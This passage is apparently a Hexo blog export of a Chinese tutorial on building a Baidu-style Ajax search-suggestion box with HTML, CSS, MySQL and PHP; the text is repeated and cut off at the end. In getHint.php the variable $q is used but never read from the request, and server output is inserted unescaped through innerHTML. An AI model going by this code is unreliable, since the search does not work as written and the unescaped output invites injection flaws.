class=\"attr\">src</span>=<span class=\"string\">\"bd_logo.png\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"logo\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"search\"</span> <span class=\"attr\">onkeyup</span>=<span class=\"string\">\"showHint(this.value)\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"button\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"百度一下\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"btn\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>之后在创建 basic.css，添加一些样式并引入到html中：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#logo</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#search</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">9px</span> <span class=\"number\">7px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">521px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">maxlength</span>: <span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#b8b8b8</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font</span>: <span class=\"number\">16px</span> arial;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#btn</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">cursor</span>: pointer;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">102px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">38px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#FFF</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#38f</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">38px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: Arial;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这时候基本页面就有了，效果如下：  </p>\n<p><img src=\"/assets/2016-03-01-ajax-baidu-search/2.png\" alt=\"\"></p>\n<p>在编写 AJax 请求时候，先在数据库创建一些伪造数据。</p>\n<h2 id=\"创建搜索数据：\"><a href=\"#创建搜索数据：\" class=\"headerlink\" title=\"创建搜索数据：\"></a>创建搜索数据：</h2><p>创建一个create.sql文件，编写如下代码：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">database</span> baidu_search;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> baidu_search;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> myData(</span><br><span class=\"line\"><span class=\"keyword\">id</span> <span class=\"built_in\">int</span> auto_increment primary <span class=\"keyword\">key</span>,</span><br><span class=\"line\"><span class=\"keyword\">data</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">20</span>) <span class=\"keyword\">not</span> <span class=\"literal\">null</span></span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">1</span>,<span class=\"string\">'ALin'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">2</span>,<span class=\"string\">'Amy'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">3</span>,<span class=\"string\">'Brittany'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">4</span>,<span class=\"string\">'Bully'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">5</span>,<span class=\"string\">'Eve'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">6</span>,<span class=\"string\">'Evita'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">7</span>,<span class=\"string\">'Eva'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">8</span>,<span class=\"string\">'Amanda'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">9</span>,<span class=\"string\">'Ellen'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">10</span>,<span class=\"string\">'Elizabeth'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">11</span>,<span class=\"string\">'Anna'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">12</span>,<span class=\"string\">'Abel'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">13</span>,<span class=\"string\">'Addison'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">14</span>,<span class=\"string\">'Alan'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">15</span>,<span class=\"string\">'Alfred'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">16</span>,<span class=\"string\">'Alger'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">17</span>,<span class=\"string\">'Allen'</span>);</span><br></pre></td></tr></table></figure>\n<p>接着我使用 php 来访问数据库并执行 sql 语句，创建一个 createdb.php, 编写如下代码:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$servername = <span class=\"string\">'your servername'</span>;</span><br><span class=\"line\">$username = <span class=\"string\">'your username'</span>;</span><br><span class=\"line\">$password = <span class=\"string\">'your password'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$con = <span class=\"keyword\">new</span> mysqli($servername,$username,$password);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$con)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Can't find the database.\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$sql = file_get_contents(<span class=\"string\">'create.sql'</span>);</span><br><span class=\"line\">$con-&gt;multi_query($sql);</span><br></pre></td></tr></table></figure>\n<p>这时候数据就已经创建成功了，接着可以从终端查看添加的数据:</p>\n<p><img src=\"/assets/2016-03-01-ajax-baidu-search/3.png\" alt=\"\"></p>\n<p>数据创建好后就可以开始编写 Javascript 代码了。</p>\n<h2 id=\"Ajax-请求部分：\"><a href=\"#Ajax-请求部分：\" class=\"headerlink\" title=\"Ajax 请求部分：\"></a>Ajax 请求部分：</h2><p>创建一个 search.js 文件，然后引入到 body 底部表单之后。 </p>\n<p>在 js 代码中，首先创建封装好的 Ajax 对象函数，代码如下：  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getAjaxObject</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> request;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">window</span>.XMLHttpRequest)&#123;</span><br><span class=\"line\">        request = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        request = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">'Microsoft.XMLHTTP'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> request;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>之后在编写回调函数，代码如下： </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">callback</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (request.readyState === <span class=\"number\">4</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (request.status === <span class=\"number\">200</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> result = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'div'</span>);</span><br><span class=\"line\">            result.id = <span class=\"string\">'result'</span>;</span><br><span class=\"line\">            <span class=\"built_in\">document</span>.body.appendChild(result);</span><br><span class=\"line\">            <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'result'</span>).innerHTML += request.responseText;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>这里动态创建一个 div，并且将后台返回的数据添加到 div 中，再将此 div 添加到 body 中。</strong></p>\n<p>之后就可以创建一个 showHint 函数用来发送 AJax 请求，代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> request = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">showHint</span>(<span class=\"params\">val</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'result'</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> result = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'result'</span>);</span><br><span class=\"line\">        result.parentNode.removeChild(result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (val.length == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    request = getAjaxObject();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (request === <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">        alert(<span class=\"string\">\"Your browser doesn't support AJax\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    request.onreadystatechange = callback;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> url = <span class=\"string\">'getHint.php?q='</span> + val;</span><br><span class=\"line\">    request.open(<span class=\"string\">'GET'</span>,url,<span class=\"literal\">true</span>);</span><br><span class=\"line\">    request.send();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>之后将 onkeyup=”showHint(this.value)” 添加到属性为 text 的 input 标签中，即：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"search\"</span> <span class=\"attr\">onkeyup</span>=<span class=\"string\">\"showHint(this.value)\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这样每当数据一个字符的时候，将调用一次 showHint 函数用来发起 AJax 请求，达到每次输入每次查询的效果。</p>\n<h2 id=\"后台部分：\"><a href=\"#后台部分：\" class=\"headerlink\" title=\"后台部分：\"></a>后台部分：</h2><p>创建一个getHint.php文件，编写如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$servername = <span class=\"string\">'your servername'</span>;</span><br><span class=\"line\">$username = <span class=\"string\">'your username'</span>;</span><br><span class=\"line\">$password = <span class=\"string\">'your password'</span>;</span><br><span class=\"line\">$db = <span class=\"string\">'baidu_search'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$con = <span class=\"keyword\">new</span> mysqli($servername,$username,$password);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$con)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Can't find the database.\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$con-&gt;select_db($db);</span><br><span class=\"line\"></span><br><span class=\"line\">$sql = <span class=\"string\">\"Select * from myData;\"</span>;</span><br><span class=\"line\">$result = $con-&gt;query($sql);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span>($row = $result-&gt;fetch_array())&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strtolower($q) == strtolower(substr($row[<span class=\"string\">'data'</span>],<span class=\"number\">0</span>,strlen($q))))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;a href='#'&gt;\"</span>.$row[<span class=\"string\">'data'</span>].<span class=\"string\">\"&lt;/a&gt;&lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/p&gt;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>自此前后端已经可以正常的发起搜索功能。</p>\n<h2 id=\"美化搜索框：\"><a href=\"#美化搜索框：\" class=\"headerlink\" title=\"美化搜索框：\"></a>美化搜索框：</h2><p>在 basic.css 中添加一些样式：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-id\">#result</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-align</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">535px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: <span class=\"number\">310px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#b8b8b8</span>;</span><br><span class=\"line\">    <span class=\"attribute\">box-shadow</span>: <span class=\"number\">1px</span> <span class=\"number\">1px</span> <span class=\"number\">1px</span> <span class=\"number\">1px</span> <span class=\"number\">#eeeeee</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#result</span> &gt; <span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#result</span> <span class=\"selector-tag\">p</span> &gt; <span class=\"selector-tag\">a</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-decoration</span>: none;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#000</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">25px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">25px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#result</span> <span class=\"selector-tag\">p</span><span class=\"selector-pseudo\">:hover</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">cursor</span>: pointer;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#eee</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"最终效果：\"><a href=\"#最终效果：\" class=\"headerlink\" title=\"最终效果：\"></a>最终效果：</h2><p><img src=\"/assets/2016-03-01-ajax-baidu-search/4.png\" alt=\"\"></p>\n<p><img src=\"/assets/2016-03-01-ajax-baidu-search/5.png\" alt=\"\"></p>\n","excerpt":"","more":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<p>在阅读此文前，建议先阅读  <a href=\"http://www.happylindz.com/2016/03/01/2016-02-29-ajax-and-cross-origin/\">Ajax - 跨域请求</a> 熟悉一下 AJax 请求，本文会跳过一些细节代码的实现说明。</p>\n<p>实现效果：</p>\n<p><img src=\"/assets/2016-03-01-ajax-baidu-search/1.png\" alt=\"\"></p>\n<p>如上图所示，在输入搜索字的时候，百度向后台发起 AJax 请求，并将后台提示信息反馈在页面上。</p>\n<p>实现起来并不困难，话不多说，就来亲自实践一下。</p>\n<h2 id=\"html-部分：\"><a href=\"#html-部分：\" class=\"headerlink\" title=\"html 部分：\"></a>html 部分：</h2><p>首先创建 index.html，添加如下结构：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"bd_logo.png\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"logo\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"search\"</span> <span class=\"attr\">onkeyup</span>=<span class=\"string\">\"showHint(this.value)\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"button\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"百度一下\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"btn\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>之后在创建 basic.css，添加一些样式并引入到html中：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#logo</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#search</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">9px</span> <span class=\"number\">7px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">521px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">maxlength</span>: <span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#b8b8b8</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font</span>: <span class=\"number\">16px</span> arial;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#btn</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">cursor</span>: pointer;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">102px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">38px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#FFF</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#38f</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">38px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: Arial;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这时候基本页面就有了，效果如下：  </p>\n<p><img src=\"/assets/2016-03-01-ajax-baidu-search/2.png\" alt=\"\"></p>\n<p>在编写 AJax 请求时候，先在数据库创建一些伪造数据。</p>\n<h2 id=\"创建搜索数据：\"><a href=\"#创建搜索数据：\" class=\"headerlink\" title=\"创建搜索数据：\"></a>创建搜索数据：</h2><p>创建一个create.sql文件，编写如下代码：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">database</span> baidu_search;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> baidu_search;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> myData(</span><br><span class=\"line\"><span class=\"keyword\">id</span> <span class=\"built_in\">int</span> auto_increment primary <span 